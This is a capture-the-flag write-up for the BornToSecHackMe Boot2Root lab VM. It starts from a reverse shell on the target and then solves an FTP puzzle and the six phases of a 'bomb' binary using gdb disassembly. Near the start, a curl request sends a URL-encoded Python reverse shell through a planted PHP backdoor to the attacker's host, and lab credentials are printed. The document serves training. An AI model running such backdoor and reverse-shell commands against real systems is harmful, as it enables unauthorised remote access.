# Boot2Root - Writeup 2

Let's start again from the part **Reverse shell** in the first writeup

Remember, we had a reverse shell with the php backdoor on the forum.

Start it with netcat (explanations on the first writeup)

**Client** (our machine):

```sh
$> ncat -nvklp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

**Server**:

```sh
curl --insecure 'https://192.168.1.22/forum/templates_c/backdoor.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.1.47%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dpty.spawn%28%22%2Fbin%2Fbash%22%29%3B%27'
```

We can search some other informations on the server to find an other way to be root...

```sh
$ cd /
$ ls
bin    dev   initrd.img  mnt   rofs  sbin     sys  var
boot   etc   lib	 opt   root  selinux  tmp  vmlinuz
cdrom  home  media	 proc  run   srv      usr
```
```sh
$ cd home
$ ls
LOOKATME  ft_root  laurie  laurie@borntosec.net  lmezard  thor	zaz
```
```sh
$ cd LOOKATME
$ ls
password
$ cat password
lmezard:G!@M6f4Eatau{sF"
```
Found a login/password again.
`lmezard`
`G!@M6f4Eatau{sF"`

Try it on ssh... Nope.

Remember all the open services

```
$ nmap 192.168.1.22                                                                    !
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-04 16:50 CEST
Nmap scan report for borntosechackme.home (192.168.1.22)
Host is up (0.00025s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```
We can try ftp

## FTP

```
$ ftp 192.168.1.22
Connected to 192.168.1.22.
220 Welcome on this server
Name (192.168.1.22:nico): lmezard
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
Good!

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
```

There is 2 files in the ftp of lmezard. Download it to read it

ftp> get README
local: README remote: README
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for README (96 bytes).
226 Transfer complete.
96 bytes received in 0.00 secs (721.1539 kB/s)
ftp> get fun
local: fun remote: fun
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for fun (808960 bytes).
226 Transfer complete.
808960 bytes received in 0.02 secs (42.6730 MB/s)
ftp> 221 Goodbye.

```
$ cat README 
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

The file `fun` is a tar archive

```
$ tar xvf fun
```

Now we have a `ft_fun` directory with a lot of pcap files. Wireshark can't open, so it's not a reals pcap files. All the files follow the same pattern

```
$ cat 00M73.pcap 
void useless() {

//file12%   
```

A line of C code and a comment with the file number.

Create a python script to add all the code, sorted by the file number in comment, in a `main.c` file

```sh
$ ./scripts/pcap_files_to_c.py
$ gcc main.c
$ ./a.out
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%
```

We have the password. Need to SHA-256 it and connect to ssh

```sh
$ echo -n 'Iheartpwnage' | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

## Laurie

Connect to ssh with the user `laurie` and the password `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

```sh
$ ssh laurie@192.168.1.22           
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.1.22's password: 
laurie@BornToSecHackMe:~$
```

Now we have a ssh connection as the `laurie` user

```
$ ls
README  bomb
$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
$ file bomb
bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.0.0, not stripped

```

There is a README for explain the challenge and one binary

```
$ ./bomb 
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!


test

BOOM!!!
The bomb has blown up.
```

The binary wait an input. Check it in GDB

```
(gdb) disas main
Dump of assembler code for function main:
   0x080489b0 <+0>:	push   ebp
   0x080489b1 <+1>:	mov    ebp,esp
   0x080489b3 <+3>:	sub    esp,0x14
   0x080489b6 <+6>:	push   ebx
   0x080489b7 <+7>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080489ba <+10>:	mov    ebx,DWORD PTR [ebp+0xc]
   0x080489bd <+13>:	cmp    eax,0x1
   0x080489c0 <+16>:	jne    0x80489d0 <main+32>
   0x080489c2 <+18>:	mov    eax,ds:0x804b648
   0x080489c7 <+23>:	mov    ds:0x804b664,eax
   0x080489cc <+28>:	jmp    0x8048a30 <main+128>
   0x080489ce <+30>:	mov    esi,esi
   0x080489d0 <+32>:	cmp    eax,0x2
   0x080489d3 <+35>:	jne    0x8048a10 <main+96>
   0x080489d5 <+37>:	add    esp,0xfffffff8
   0x080489d8 <+40>:	push   0x8049620
   0x080489dd <+45>:	mov    eax,DWORD PTR [ebx+0x4]
   0x080489e0 <+48>:	push   eax
   0x080489e1 <+49>:	call   0x8048880 <fopen@plt>
   0x080489e6 <+54>:	mov    ds:0x804b664,eax
   0x080489eb <+59>:	add    esp,0x10
   0x080489ee <+62>:	test   eax,eax
   0x080489f0 <+64>:	jne    0x8048a30 <main+128>
   0x080489f2 <+66>:	add    esp,0xfffffffc
   0x080489f5 <+69>:	mov    eax,DWORD PTR [ebx+0x4]
   0x080489f8 <+72>:	push   eax
   0x080489f9 <+73>:	mov    eax,DWORD PTR [ebx]
   0x080489fb <+75>:	push   eax
   0x080489fc <+76>:	push   0x8049622
   0x08048a01 <+81>:	call   0x8048810 <printf@plt>
   0x08048a06 <+86>:	add    esp,0xfffffff4
   0x08048a09 <+89>:	push   0x8
   0x08048a0b <+91>:	call   0x8048850 <exit@plt>
   0x08048a10 <+96>:	add    esp,0xfffffff8
   0x08048a13 <+99>:	mov    eax,DWORD PTR [ebx]
   0x08048a15 <+101>:	push   eax
   0x08048a16 <+102>:	push   0x804963f
   0x08048a1b <+107>:	call   0x8048810 <printf@plt>
   0x08048a20 <+112>:	add    esp,0xfffffff4
   0x08048a23 <+115>:	push   0x8
---Type <return> to continue, or q <return> to quit---
   0x08048a25 <+117>:	call   0x8048850 <exit@plt>
   0x08048a2a <+122>:	lea    esi,[esi+0x0]
   0x08048a30 <+128>:	call   0x8049160 <initialize_bomb>
   0x08048a35 <+133>:	add    esp,0xfffffff4
   0x08048a38 <+136>:	push   0x8049660
   0x08048a3d <+141>:	call   0x8048810 <printf@plt>
   0x08048a42 <+146>:	add    esp,0xfffffff4
   0x08048a45 <+149>:	push   0x80496a0
   0x08048a4a <+154>:	call   0x8048810 <printf@plt>
   0x08048a4f <+159>:	add    esp,0x20
   0x08048a52 <+162>:	call   0x80491fc <read_line>
   0x08048a57 <+167>:	add    esp,0xfffffff4
   0x08048a5a <+170>:	push   eax
   0x08048a5b <+171>:	call   0x8048b20 <phase_1>
   0x08048a60 <+176>:	call   0x804952c <phase_defused>
   0x08048a65 <+181>:	add    esp,0xfffffff4
   0x08048a68 <+184>:	push   0x80496e0
   0x08048a6d <+189>:	call   0x8048810 <printf@plt>
   0x08048a72 <+194>:	add    esp,0x20
   0x08048a75 <+197>:	call   0x80491fc <read_line>
   0x08048a7a <+202>:	add    esp,0xfffffff4
   0x08048a7d <+205>:	push   eax
   0x08048a7e <+206>:	call   0x8048b48 <phase_2>
   0x08048a83 <+211>:	call   0x804952c <phase_defused>
   0x08048a88 <+216>:	add    esp,0xfffffff4
   0x08048a8b <+219>:	push   0x8049720
   0x08048a90 <+224>:	call   0x8048810 <printf@plt>
   0x08048a95 <+229>:	add    esp,0x20
   0x08048a98 <+232>:	call   0x80491fc <read_line>
   0x08048a9d <+237>:	add    esp,0xfffffff4
   0x08048aa0 <+240>:	push   eax
   0x08048aa1 <+241>:	call   0x8048b98 <phase_3>
   0x08048aa6 <+246>:	call   0x804952c <phase_defused>
   0x08048aab <+251>:	add    esp,0xfffffff4
   0x08048aae <+254>:	push   0x804973f
   0x08048ab3 <+259>:	call   0x8048810 <printf@plt>
   0x08048ab8 <+264>:	add    esp,0x20
   0x08048abb <+267>:	call   0x80491fc <read_line>
   0x08048ac0 <+272>:	add    esp,0xfffffff4
   0x08048ac3 <+275>:	push   eax
   0x08048ac4 <+276>:	call   0x8048ce0 <phase_4>
---Type <return> to continue, or q <return> to quit---
   0x08048ac9 <+281>:	call   0x804952c <phase_defused>
   0x08048ace <+286>:	add    esp,0xfffffff4
   0x08048ad1 <+289>:	push   0x8049760
   0x08048ad6 <+294>:	call   0x8048810 <printf@plt>
   0x08048adb <+299>:	add    esp,0x20
   0x08048ade <+302>:	call   0x80491fc <read_line>
   0x08048ae3 <+307>:	add    esp,0xfffffff4
   0x08048ae6 <+310>:	push   eax
   0x08048ae7 <+311>:	call   0x8048d2c <phase_5>
   0x08048aec <+316>:	call   0x804952c <phase_defused>
   0x08048af1 <+321>:	add    esp,0xfffffff4
   0x08048af4 <+324>:	push   0x80497a0
   0x08048af9 <+329>:	call   0x8048810 <printf@plt>
   0x08048afe <+334>:	add    esp,0x20
   0x08048b01 <+337>:	call   0x80491fc <read_line>
   0x08048b06 <+342>:	add    esp,0xfffffff4
   0x08048b09 <+345>:	push   eax
   0x08048b0a <+346>:	call   0x8048d98 <phase_6>
   0x08048b0f <+351>:	call   0x804952c <phase_defused>
   0x08048b14 <+356>:	xor    eax,eax
   0x08048b16 <+358>:	mov    ebx,DWORD PTR [ebp-0x18]
   0x08048b19 <+361>:	mov    esp,ebp
   0x08048b1b <+363>:	pop    ebp
   0x08048b1c <+364>:	ret    
End of assembler dump.
```

We can resume the behavior of the program to:

- readline
- phase_X (check the line)
- if line good next phase (total 6) else BOMB

We can check the phases functions

### Phase 1

```
(gdb) disas phase_1
Dump of assembler code for function phase_1:
   0x08048b20 <+0>:	    push   ebp
   0x08048b21 <+1>:	    mov    ebp,esp
   0x08048b23 <+3>:	    sub    esp,0x8
   0x08048b26 <+6>:	    mov    eax,DWORD PTR [ebp+0x8]
   0x08048b29 <+9>:	    add    esp,0xfffffff8
   0x08048b2c <+12>:	push   0x80497c0
   0x08048b31 <+17>:	push   eax
   0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>
   0x08048b37 <+23>:	add    esp,0x10
   0x08048b3a <+26>:	test   eax,eax
   0x08048b3c <+28>:	je     0x8048b43 <phase_1+35>
   0x08048b3e <+30>:	call   0x80494fc <explode_bomb>
   0x08048b43 <+35>:	mov    esp,ebp
   0x08048b45 <+37>:	pop    ebp
   0x08048b46 <+38>:	ret    
End of assembler dump.
(gdb) x/s 0x80497c0
0x80497c0:	 "Public speaking is very easy."

```

This is a comp with the input line and a string in the program. Compared with the function `strings_not_equal`.

The needed string is **"Public speaking is very easy."**

### Phase 2

```
(gdb) disas phase_2
Dump of assembler code for function phase_2:
   0x08048b48 <+0>:	    push   ebp
   0x08048b49 <+1>:	    mov    ebp,esp
   0x08048b4b <+3>:	    sub    esp,0x20
   0x08048b4e <+6>:	    push   esi
   0x08048b4f <+7>:	    push   ebx
   0x08048b50 <+8>:	    mov    edx,DWORD PTR [ebp+0x8]
   0x08048b53 <+11>:	add    esp,0xfffffff8
   0x08048b56 <+14>:	lea    eax,[ebp-0x18]
   0x08048b59 <+17>:	push   eax
   0x08048b5a <+18>:	push   edx
   0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
   0x08048b60 <+24>:	add    esp,0x10
   0x08048b63 <+27>:	cmp    DWORD PTR [ebp-0x18],0x1
   0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>
   0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
   0x08048b6e <+38>:	mov    ebx,0x1
   0x08048b73 <+43>:	lea    esi,[ebp-0x18]
   0x08048b76 <+46>:	lea    eax,[ebx+0x1]
   0x08048b79 <+49>:	imul   eax,DWORD PTR [esi+ebx*4-0x4]
   0x08048b7e <+54>:	cmp    DWORD PTR [esi+ebx*4],eax
   0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>
   0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
   0x08048b88 <+64>:	inc    ebx
   0x08048b89 <+65>:	cmp    ebx,0x5
   0x08048b8c <+68>:	jle    0x8048b76 <phase_2+46>
   0x08048b8e <+70>:	lea    esp,[ebp-0x28]
   0x08048b91 <+73>:	pop    ebx
   0x08048b92 <+74>:	pop    esi
   0x08048b93 <+75>:	mov    esp,ebp
   0x08048b95 <+77>:	pop    ebp
   0x08048b96 <+78>:	ret    
End of assembler dump.
```

Get 6 numbers from the input line with the function `read_six_numbers`.
Compare each numbers in a loop with an algorithm to get the expected value. Translate in C

```C
int i = 0;
while (i <= 5) {
    if (input_numbers[i] != (input_numbers[i - 1] * (i + 1)) {
        explode_bomb();
    }
    i++;
}
```

We make the same algorithm in python to get the numbers

The expected numbers is: `1 2 6 24 120 720`

### Phase 3

```
(gdb) disas phase_3
   0x08048b98 <+0>:	    push   ebp
   0x08048b99 <+1>:	    mov    ebp,esp
   0x08048b9b <+3>:	    sub    esp,0x14
   0x08048b9e <+6>:	    push   ebx
   0x08048b9f <+7>:	    mov    edx,DWORD PTR [ebp+0x8]
   0x08048ba2 <+10>:	add    esp,0xfffffff4
   0x08048ba5 <+13>:	lea    eax,[ebp-0x4]
   0x08048ba8 <+16>:	push   eax
   0x08048ba9 <+17>:	lea    eax,[ebp-0x5]
   0x08048bac <+20>:	push   eax
   0x08048bad <+21>:	lea    eax,[ebp-0xc]
   0x08048bb0 <+24>:	push   eax
   0x08048bb1 <+25>:	push   0x80497de
   0x08048bb6 <+30>:	push   edx
   0x08048bb7 <+31>:	call   0x8048860 <sscanf@plt>
   0x08048bbc <+36>:	add    esp,0x20
   0x08048bbf <+39>:	cmp    eax,0x2
   0x08048bc2 <+42>:	jg     0x8048bc9 <phase_3+49>
   0x08048bc4 <+44>:	call   0x80494fc <explode_bomb>
   0x08048bc9 <+49>:	cmp    DWORD PTR [ebp-0xc],0x7
   0x08048bcd <+53>:	ja     0x8048c88 <phase_3+240>
   0x08048bd3 <+59>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048bd6 <+62>:	jmp    DWORD PTR [eax*4+0x80497e8]
   0x08048bdd <+69>:	lea    esi,[esi+0x0]
   0x08048be0 <+72>:	mov    bl,0x71
   0x08048be2 <+74>:	cmp    DWORD PTR [ebp-0x4],0x309
   0x08048be9 <+81>:	je     0x8048c8f <phase_3+247>
   0x08048bef <+87>:	call   0x80494fc <explode_bomb>
   0x08048bf4 <+92>:	jmp    0x8048c8f <phase_3+247>
   0x08048bf9 <+97>:	lea    esi,[esi+eiz*1+0x0]
   0x08048c00 <+104>:	mov    bl,0x62
   0x08048c02 <+106>:	cmp    DWORD PTR [ebp-0x4],0xd6
   0x08048c09 <+113>:	je     0x8048c8f <phase_3+247>
   0x08048c0f <+119>:	call   0x80494fc <explode_bomb>
   0x08048c14 <+124>:	jmp    0x8048c8f <phase_3+247>
   0x08048c16 <+126>:	mov    bl,0x62
   0x08048c18 <+128>:	cmp    DWORD PTR [ebp-0x4],0x2f3
   0x08048c1f <+135>:	je     0x8048c8f <phase_3+247>
   0x08048c21 <+137>:	call   0x80494fc <explode_bomb>
   0x08048c26 <+142>:	jmp    0x8048c8f <phase_3+247>
   0x08048c28 <+144>:	mov    bl,0x6b
   0x08048c2a <+146>:	cmp    DWORD PTR [ebp-0x4],0xfb
   0x08048c31 <+153>:	je     0x8048c8f <phase_3+247>
   0x08048c33 <+155>:	call   0x80494fc <explode_bomb>
   0x08048c38 <+160>:	jmp    0x8048c8f <phase_3+247>
   0x08048c3a <+162>:	lea    esi,[esi+0x0]
   0x08048c40 <+168>:	mov    bl,0x6f
   0x08048c42 <+170>:	cmp    DWORD PTR [ebp-0x4],0xa0
   0x08048c49 <+177>:	je     0x8048c8f <phase_3+247>
   0x08048c4b <+179>:	call   0x80494fc <explode_bomb>
   0x08048c50 <+184>:	jmp    0x8048c8f <phase_3+247>
   0x08048c52 <+186>:	mov    bl,0x74
   0x08048c54 <+188>:	cmp    DWORD PTR [ebp-0x4],0x1ca
   0x08048c5b <+195>:	je     0x8048c8f <phase_3+247>
   0x08048c5d <+197>:	call   0x80494fc <explode_bomb>
   0x08048c62 <+202>:	jmp    0x8048c8f <phase_3+247>
   0x08048c64 <+204>:	mov    bl,0x76
   0x08048c66 <+206>:	cmp    DWORD PTR [ebp-0x4],0x30c
   0x08048c6d <+213>:	je     0x8048c8f <phase_3+247>
   0x08048c6f <+215>:	call   0x80494fc <explode_bomb>
   0x08048c74 <+220>:	jmp    0x8048c8f <phase_3+247>
   0x08048c76 <+222>:	mov    bl,0x62
   0x08048c78 <+224>:	cmp    DWORD PTR [ebp-0x4],0x20c
   0x08048c7f <+231>:	je     0x8048c8f <phase_3+247>
   0x08048c81 <+233>:	call   0x80494fc <explode_bomb>
   0x08048c86 <+238>:	jmp    0x8048c8f <phase_3+247>
   0x08048c88 <+240>:	mov    bl,0x78
   0x08048c8a <+242>:	call   0x80494fc <explode_bomb>
   0x08048c8f <+247>:	cmp    bl,BYTE PTR [ebp-0x5]
   0x08048c92 <+250>:	je     0x8048c99 <phase_3+257>
   0x08048c94 <+252>:	call   0x80494fc <explode_bomb>
   0x08048c99 <+257>:	mov    ebx,DWORD PTR [ebp-0x18]
   0x08048c9c <+260>:	mov    esp,ebp
   0x08048c9e <+262>:	pop    ebp
   0x08048c9f <+263>:	ret    
```

Get 1 number, 1 char and 1 number from the command line. Apply a condition for check the matching of the numbers and the char together. Translate in C

```C
switch(first) {
case 0:
    c = 'q';
    if (third != 777) {
        explode_bomb();
    }
    break;
case 1:
    c = 'b';
    if (third != 214) {
        explode_bomb();
    }
    break;
case 2:
    c = 'b';
    if (third != 755) {
        explode_bomb();
    }
    break;
case 3:
    c = 'k';
    if (third != 251) {
        explode_bomb();
    }
    break;
case 4:
    c = 'o';
    if (third != 160) {
        explode_bomb();
    }
    break;
case 5:
    c = 't';
    if (third != 458) {
        explode_bomb();
    }
    break;
case 6:
    c = 'v';
    if (third != 780) {
        explode_bomb();
    }
    break;
case 7:
    c = 'b';
    if (third != 524) {
    explode_bomb();
    }
    break;
default:
    c = 'x';
    explode_bomb();
}
if (c != second) {
    explode_bomb();
}
```

For the result, we have many possibilities, let's choose the first.

Result: `0 q 777`

### Phase 4

```
(gdb) disas phase_4
   0x08048ce0 <+0>:	    push   ebp
   0x08048ce1 <+1>:	    mov    ebp,esp
   0x08048ce3 <+3>:	    sub    esp,0x18
   0x08048ce6 <+6>:	    mov    edx,DWORD PTR [ebp+0x8]
   0x08048ce9 <+9>:	    add    esp,0xfffffffc
   0x08048cec <+12>:	lea    eax,[ebp-0x4]
   0x08048cef <+15>:	push   eax
   0x08048cf0 <+16>:	push   0x8049808
   0x08048cf5 <+21>:	push   edx
   0x08048cf6 <+22>:	call   0x8048860 <sscanf@plt>
   0x08048cfb <+27>:	add    esp,0x10
   0x08048cfe <+30>:	cmp    eax,0x1
   0x08048d01 <+33>:	jne    0x8048d09 <phase_4+41>
   0x08048d03 <+35>:	cmp    DWORD PTR [ebp-0x4],0x0
   0x08048d07 <+39>:	jg     0x8048d0e <phase_4+46>
   0x08048d09 <+41>:	call   0x80494fc <explode_bomb>
   0x08048d0e <+46>:	add    esp,0xfffffff4
   0x08048d11 <+49>:	mov    eax,DWORD PTR [ebp-0x4]
   0x08048d14 <+52>:	push   eax
   0x08048d15 <+53>:	call   0x8048ca0 <func4>
   0x08048d1a <+58>:	add    esp,0x10
   0x08048d1d <+61>:	cmp    eax,0x37
   0x08048d20 <+64>:	je     0x8048d27 <phase_4+71>
   0x08048d22 <+66>:	call   0x80494fc <explode_bomb>
   0x08048d27 <+71>:	mov    esp,ebp
   0x08048d29 <+73>:	pop    ebp
   0x08048d2a <+74>:	ret   
```

Get 1 number from the command line. Applyan algorithm to check the number. Translate in C

```C
int func4(int nb) {
    if (nb <= 1)
        return 1;
    int n1 = func4(nb - 1);
    int n2 = func4(nb - 2);
    return n1 + n2
}

void phase_4(char *line) {
    int nb;
    len = sscanf(line, "%d", nb)
    if (len != 1) {
        explode_bomb();
    }
    if (nb > 0) {
        if (func4(nb) != 55)
            explode_bomb();
    }
    return;
}
```

We can write this function in python for testing all numbers and get the good number!

Result: `9`

### Phase 5

```
(gdb) disas phase_5
   0x08048d2c <+0>:	    push   ebp
   0x08048d2d <+1>:	    mov    ebp,esp
   0x08048d2f <+3>:	    sub    esp,0x10
   0x08048d32 <+6>:	    push   esi
   0x08048d33 <+7>:	    push   ebx
   0x08048d34 <+8>:	    mov    ebx,DWORD PTR [ebp+0x8]
   0x08048d37 <+11>:	add    esp,0xfffffff4
   0x08048d3a <+14>:	push   ebx
   0x08048d3b <+15>:	call   0x8049018 <string_length>
   0x08048d40 <+20>:	add    esp,0x10
   0x08048d43 <+23>:	cmp    eax,0x6
   0x08048d46 <+26>:	je     0x8048d4d <phase_5+33>
   0x08048d48 <+28>:	call   0x80494fc <explode_bomb>
   0x08048d4d <+33>:	xor    edx,edx
   0x08048d4f <+35>:	lea    ecx,[ebp-0x8]
   0x08048d52 <+38>:	mov    esi,0x804b220
   0x08048d57 <+43>:	mov    al,BYTE PTR [edx+ebx*1]
   0x08048d5a <+46>:	and    al,0xf
   0x08048d5c <+48>:	movsx  eax,al
   0x08048d5f <+51>:	mov    al,BYTE PTR [eax+esi*1]
   0x08048d62 <+54>:	mov    BYTE PTR [edx+ecx*1],al
   0x08048d65 <+57>:	inc    edx
   0x08048d66 <+58>:	cmp    edx,0x5
   0x08048d69 <+61>:	jle    0x8048d57 <phase_5+43>
   0x08048d6b <+63>:	mov    BYTE PTR [ebp-0x2],0x0
   0x08048d6f <+67>:	add    esp,0xfffffff8
   0x08048d72 <+70>:	push   0x804980b
   0x08048d77 <+75>:	lea    eax,[ebp-0x8]
   0x08048d7a <+78>:	push   eax
   0x08048d7b <+79>:	call   0x8049030 <strings_not_equal>
   0x08048d80 <+84>:	add    esp,0x10
   0x08048d83 <+87>:	test   eax,eax
   0x08048d85 <+89>:	je     0x8048d8c <phase_5+96>
   0x08048d87 <+91>:	call   0x80494fc <explode_bomb>
   0x08048d8c <+96>:	lea    esp,[ebp-0x18]
   0x08048d8f <+99>:	pop    ebx
   0x08048d90 <+100>:	pop    esi
   0x08048d91 <+101>:	mov    esp,ebp
   0x08048d93 <+103>:	pop    ebp
   0x08048d94 <+104>:	ret    
```

Take 1 string from the command line and apply an algorithm to translate the string with a correspondence table (a string "isrveawhobpnutfg") and match it with a string "giants". Translate in C

```C
void phase_5(char *line) {
    int len = string_length(line);
    if (len != 6) {
        explode_bomb();
    }
    i = 0;
    char *string = "isrveawhobpnutfg"
    while (i != 5) {
        line[i] = string[line[i] & 0xf];
        i++;
    }
    if (strings_not_equal(line, "giants") != 0) {
        explode_bomb();
    }
    return;
}
```

Rewrite it in python for testing

```py
def phase_5(line):
    static_string = "isrveawhobpnutfg"
    r = ""
    for c in line:
        index = ord(c) & 0xf
        r += static_string[index]
    return r
print(phase_5('abc'))
```

Print `srvea`

The algorithm replace the alphabet with the correspondence table, starting at index 1 and not 0. Let's write a resolver in python

Result: `opukmq`

### Phase 6

```
(gdb) disas phase_6
   0x08048d98 <+0>:	    push   ebp
   0x08048d99 <+1>:	    mov    ebp,esp
   0x08048d9b <+3>:	    sub    esp,0x4c
   0x08048d9e <+6>:	    push   edi
   0x08048d9f <+7>:	    push   esi
   0x08048da0 <+8>:	    push   ebx
   0x08048da1 <+9>:	    mov    edx,DWORD PTR [ebp+0x8]
   0x08048da4 <+12>:	mov    DWORD PTR [ebp-0x34],0x804b26c
   0x08048dab <+19>:	add    esp,0xfffffff8
   0x08048dae <+22>:	lea    eax,[ebp-0x18]
   0x08048db1 <+25>:	push   eax
   0x08048db2 <+26>:	push   edx
   0x08048db3 <+27>:	call   0x8048fd8 <read_six_numbers>
   0x08048db8 <+32>:	xor    edi,edi
   0x08048dba <+34>:	add    esp,0x10
   0x08048dbd <+37>:	lea    esi,[esi+0x0]
   0x08048dc0 <+40>:	lea    eax,[ebp-0x18]
   0x08048dc3 <+43>:	mov    eax,DWORD PTR [eax+edi*4]
   0x08048dc6 <+46>:	dec    eax
   0x08048dc7 <+47>:	cmp    eax,0x5
   0x08048dca <+50>:	jbe    0x8048dd1 <phase_6+57>
   0x08048dcc <+52>:	call   0x80494fc <explode_bomb>
   0x08048dd1 <+57>:	lea    ebx,[edi+0x1]
   0x08048dd4 <+60>:	cmp    ebx,0x5
   0x08048dd7 <+63>:	jg     0x8048dfc <phase_6+100>
   0x08048dd9 <+65>:	lea    eax,[edi*4+0x0]
   0x08048de0 <+72>:	mov    DWORD PTR [ebp-0x38],eax
   0x08048de3 <+75>:	lea    esi,[ebp-0x18]
   0x08048de6 <+78>:	mov    edx,DWORD PTR [ebp-0x38]
   0x08048de9 <+81>:	mov    eax,DWORD PTR [edx+esi*1]
   0x08048dec <+84>:	cmp    eax,DWORD PTR [esi+ebx*4]
   0x08048def <+87>:	jne    0x8048df6 <phase_6+94>
   0x08048df1 <+89>:	call   0x80494fc <explode_bomb>
   0x08048df6 <+94>:	inc    ebx
   0x08048df7 <+95>:	cmp    ebx,0x5
   0x08048dfa <+98>:	jle    0x8048de6 <phase_6+78>
   0x08048dfc <+100>:	inc    edi
   0x08048dfd <+101>:	cmp    edi,0x5
   0x08048e00 <+104>:	jle    0x8048dc0 <phase_6+40>
   0x08048e02 <+106>:	xor    edi,edi
   0x08048e04 <+108>:	lea    ecx,[ebp-0x18]
   0x08048e07 <+111>:	lea    eax,[ebp-0x30]
   0x08048e0a <+114>:	mov    DWORD PTR [ebp-0x3c],eax
   0x08048e0d <+117>:	lea    esi,[esi+0x0]
   0x08048e10 <+120>:	mov    esi,DWORD PTR [ebp-0x34]
   0x08048e13 <+123>:	mov    ebx,0x1
   0x08048e18 <+128>:	lea    eax,[edi*4+0x0]
   0x08048e1f <+135>:	mov    edx,eax
   0x08048e21 <+137>:	cmp    ebx,DWORD PTR [eax+ecx*1]
   0x08048e24 <+140>:	jge    0x8048e38 <phase_6+160>
   0x08048e26 <+142>:	mov    eax,DWORD PTR [edx+ecx*1]
   0x08048e29 <+145>:	lea    esi,[esi+eiz*1+0x0]
   0x08048e30 <+152>:	mov    esi,DWORD PTR [esi+0x8]
   0x08048e33 <+155>:	inc    ebx
   0x08048e34 <+156>:	cmp    ebx,eax
   0x08048e36 <+158>:	jl     0x8048e30 <phase_6+152>
   0x08048e38 <+160>:	mov    edx,DWORD PTR [ebp-0x3c]
   0x08048e3b <+163>:	mov    DWORD PTR [edx+edi*4],esi
   0x08048e3e <+166>:	inc    edi
   0x08048e3f <+167>:	cmp    edi,0x5
   0x08048e42 <+170>:	jle    0x8048e10 <phase_6+120>
   0x08048e44 <+172>:	mov    esi,DWORD PTR [ebp-0x30]
   0x08048e47 <+175>:	mov    DWORD PTR [ebp-0x34],esi
   0x08048e4a <+178>:	mov    edi,0x1
   0x08048e4f <+183>:	lea    edx,[ebp-0x30]
   0x08048e52 <+186>:	mov    eax,DWORD PTR [edx+edi*4]
   0x08048e55 <+189>:	mov    DWORD PTR [esi+0x8],eax
   0x08048e58 <+192>:	mov    esi,eax
   0x08048e5a <+194>:	inc    edi
   0x08048e5b <+195>:	cmp    edi,0x5
   0x08048e5e <+198>:	jle    0x8048e52 <phase_6+186>
   0x08048e60 <+200>:	mov    DWORD PTR [esi+0x8],0x0
   0x08048e67 <+207>:	mov    esi,DWORD PTR [ebp-0x34]
   0x08048e6a <+210>:	xor    edi,edi
   0x08048e6c <+212>:	lea    esi,[esi+eiz*1+0x0]
   0x08048e70 <+216>:	mov    edx,DWORD PTR [esi+0x8]
   0x08048e73 <+219>:	mov    eax,DWORD PTR [esi]
   0x08048e75 <+221>:	cmp    eax,DWORD PTR [edx]
   0x08048e77 <+223>:	jge    0x8048e7e <phase_6+230>
   0x08048e79 <+225>:	call   0x80494fc <explode_bomb>
   0x08048e7e <+230>:	mov    esi,DWORD PTR [esi+0x8]
   0x08048e81 <+233>:	inc    edi
   0x08048e82 <+234>:	cmp    edi,0x4
   0x08048e85 <+237>:	jle    0x8048e70 <phase_6+216>
   0x08048e87 <+239>:	lea    esp,[ebp-0x58]
   0x08048e8a <+242>:	pop    ebx
   0x08048e8b <+243>:	pop    esi
   0x08048e8c <+244>:	pop    edi
   0x08048e8d <+245>:	mov    esp,ebp
   0x08048e8f <+247>:	pop    ebp
   0x08048e90 <+248>:	ret    
```

Take 6 numbers from the input line. After open in Ghidra, we can see the program use 6 globals variables `nodeX` (`node1`, `node2`, etc), and apply a sort on it in a tab of int. Sorted by the numbers in the input. Let's print all the nodes values with gdb

```
(gdb) p node1
$1 = 253
(gdb) p node2
$2 = 725
(gdb) p node3
$3 = 301
(gdb) p node4
$4 = 997
(gdb) p node5
$5 = 212
(gdb) p node6
$6 = 432
```

We need to know wich type of sorting. In the output of the program, there is a clue, the numbers start by `4`. The node4 is the biggest value, we can try in descending order `4 2 6 3 1 5`

